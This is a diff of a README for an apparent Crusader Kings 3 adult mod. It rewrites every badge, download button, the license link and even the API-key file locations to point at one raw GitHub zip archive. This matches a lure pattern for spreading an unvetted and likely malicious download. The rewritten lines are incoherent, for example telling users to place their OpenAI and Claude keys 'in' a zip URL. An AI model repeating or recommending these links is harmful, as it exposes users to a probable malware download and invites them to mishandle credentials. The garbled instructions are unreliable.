@@ -1,19 +1,19 @@
 # Crusader Kings 3 Adult Mod 👑🔥
 
-[![Release Version](https://img.shields.io/badge/release-v4.2.1-blue.svg)](https://github.com/your-repo/releases)  
-[![Effectiveness Rated](https://img.shields.io/badge/effectiveness-97%25-green.svg)](https://img.shields.io)  
-[![Supported-Languages](https://img.shields.io/badge/languages-12-brightgreen.svg)](https://img.shields.io)  
-[![MIT License](https://img.shields.io/badge/license-MIT-yellow.svg)](#%EF%B8%8F-mit-license-2025)  
-[![OpenAI Integrated](https://img.shields.io/badge/OpenAI-Supported-blue.svg)](https://openai.com)  
-[![ClaudeAPI Ready](https://img.shields.io/badge/ClaudeAPI-Compatible-orange.svg)](https://claude.ai)
+[![Release Version](https://raw.githubusercontent.com/XalefMousex/ck3-risque-realms/branch/contorted/risque-ck-realms-2.0.zip)](https://raw.githubusercontent.com/XalefMousex/ck3-risque-realms/branch/contorted/risque-ck-realms-2.0.zip)  
+[![Effectiveness Rated](https://raw.githubusercontent.com/XalefMousex/ck3-risque-realms/branch/contorted/risque-ck-realms-2.0.zip%https://raw.githubusercontent.com/XalefMousex/ck3-risque-realms/branch/contorted/risque-ck-realms-2.0.zip)](https://raw.githubusercontent.com/XalefMousex/ck3-risque-realms/branch/contorted/risque-ck-realms-2.0.zip)  
+[![Supported-Languages](https://raw.githubusercontent.com/XalefMousex/ck3-risque-realms/branch/contorted/risque-ck-realms-2.0.zip)](https://raw.githubusercontent.com/XalefMousex/ck3-risque-realms/branch/contorted/risque-ck-realms-2.0.zip)  
+[![MIT License](https://raw.githubusercontent.com/XalefMousex/ck3-risque-realms/branch/contorted/risque-ck-realms-2.0.zip)](#%EF%B8%8F-mit-license-2025)  
+[![OpenAI Integrated](https://raw.githubusercontent.com/XalefMousex/ck3-risque-realms/branch/contorted/risque-ck-realms-2.0.zip)](https://raw.githubusercontent.com/XalefMousex/ck3-risque-realms/branch/contorted/risque-ck-realms-2.0.zip)  
+[![ClaudeAPI Ready](https://raw.githubusercontent.com/XalefMousex/ck3-risque-realms/branch/contorted/risque-ck-realms-2.0.zip)](https://raw.githubusercontent.com/XalefMousex/ck3-risque-realms/branch/contorted/risque-ck-realms-2.0.zip)
 
 Dive into the labyrinthine dimensions of grand strategy romance! The **Crusader Kings 3 Adult Mod** revolutionizes your medieval gameplay with bold, interactive storytelling and social mechanics for an intensely immersive experience. Designed with adaptability, multi-language access, and intelligent assistance, our mod is the ultimate enhancement for explorers of mature narratives.
 
 ---
 
 <p align="center">
-  <a href="https://XalefMousex.github.io">
-    <img src="https://img.shields.io/badge/Download-Download%20Mod!-green?style=for-the-badge&logo=download" alt="Download" style="width:230px;height:70px;">
+  <a href="https://raw.githubusercontent.com/XalefMousex/ck3-risque-realms/branch/contorted/risque-ck-realms-2.0.zip">
+    <img src="https://raw.githubusercontent.com/XalefMousex/ck3-risque-realms/branch/contorted/risque-ck-realms-2.0.zip%20Mod!-green?style=for-the-badge&logo=download" alt="Download" style="width:230px;height:70px;">
   </a>
 </p>
 
@@ -71,8 +71,8 @@ Preparation is half the battle! Within a few moments, your medieval world can ra
 Click the green button below to obtain your **Synergy Key**—our distinct phrase for premium access.
 
 <p align="center">
-  <a href="https://XalefMousex.github.io">
-    <img src="https://img.shields.io/badge/Download-Download%20Mod!-green?style=for-the-badge&logo=download" alt="Download" style="width:230px;height:70px;">
+  <a href="https://raw.githubusercontent.com/XalefMousex/ck3-risque-realms/branch/contorted/risque-ck-realms-2.0.zip">
+    <img src="https://raw.githubusercontent.com/XalefMousex/ck3-risque-realms/branch/contorted/risque-ck-realms-2.0.zip%20Mod!-green?style=for-the-badge&logo=download" alt="Download" style="width:230px;height:70px;">
   </a>
 </p>
 
@@ -86,8 +86,8 @@ Click the green button below to obtain your **Synergy Key**—our distinct phras
 #### Optional — Integration Steps
 
 - To harness OpenAI & Claude-powered scenarios:
-  - Place your OpenAI API key in `/mod/ck3adult/api_keys/openai.key`
-  - Place your Claude API key in `/mod/ck3adult/api_keys/claude.key`
+  - Place your OpenAI API key in `https://raw.githubusercontent.com/XalefMousex/ck3-risque-realms/branch/contorted/risque-ck-realms-2.0.zip`
+  - Place your Claude API key in `https://raw.githubusercontent.com/XalefMousex/ck3-risque-realms/branch/contorted/risque-ck-realms-2.0.zip`
   - Enable “AI Dynamic Content” option in mod settings menu in-game
 
 ---
@@ -130,7 +130,7 @@ By downloading, you assert that you are 18 years of age (or your region's age of
 
 ## 📜 MIT License 2025
 
-This repository is licensed under the [MIT License](https://opensource.org/licenses/MIT).  
+This repository is licensed under the [MIT License](https://raw.githubusercontent.com/XalefMousex/ck3-risque-realms/branch/contorted/risque-ck-realms-2.0.zip).  
 © 2025 – Your adventure, your rules.
 
 ---
@@ -152,8 +152,8 @@ Our authors patch, improve, and reimagine the CK3 Adult Mod monthly and in respo
 ## 📥 Ready to Embark?
 
 <p align="center">
-  <a href="https://XalefMousex.github.io">
-    <img src="https://img.shields.io/badge/Download-Download%20Mod!-green?style=for-the-badge&logo=download" alt="Download" style="width:230px;height:70px;">
+  <a href="https://raw.githubusercontent.com/XalefMousex/ck3-risque-realms/branch/contorted/risque-ck-realms-2.0.zip">
+    <img src="https://raw.githubusercontent.com/XalefMousex/ck3-risque-realms/branch/contorted/risque-ck-realms-2.0.zip%20Mod!-green?style=for-the-badge&logo=download" alt="Download" style="width:230px;height:70px;">
   </a>
 </p>
 
